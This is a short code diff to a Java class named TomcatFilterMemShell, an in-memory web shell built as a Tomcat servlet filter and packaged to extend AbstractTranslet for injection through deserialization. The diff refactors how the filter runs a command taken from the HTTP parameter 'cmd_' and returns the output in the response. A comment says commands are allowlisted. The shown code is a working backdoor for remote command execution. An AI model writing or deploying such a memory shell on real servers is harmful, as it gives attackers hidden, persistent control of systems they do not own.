@@ -96,14 +96,13 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
         String cmd;
         if ((cmd = servletRequest.getParameter("cmd_")) != null) {
             // Allowlisted command + validated args, run as argv without a shell.
-            java.util.List<String> argv = SafeCommand.toArgv(cmd);
-            if (argv == null) {
+            String output = SafeCommand.runCommand(cmd, false);
+            if (output == null) {
                 servletResponse.getOutputStream().write("Bad boy. I got u.\n".getBytes());
                 servletResponse.getOutputStream().flush();
                 servletResponse.getOutputStream().close();
                 return;
             }
-            String output = SafeCommand.run(argv, false);
             servletResponse.getOutputStream().write(output.getBytes());
             servletResponse.getOutputStream().flush();
             servletResponse.getOutputStream().close();
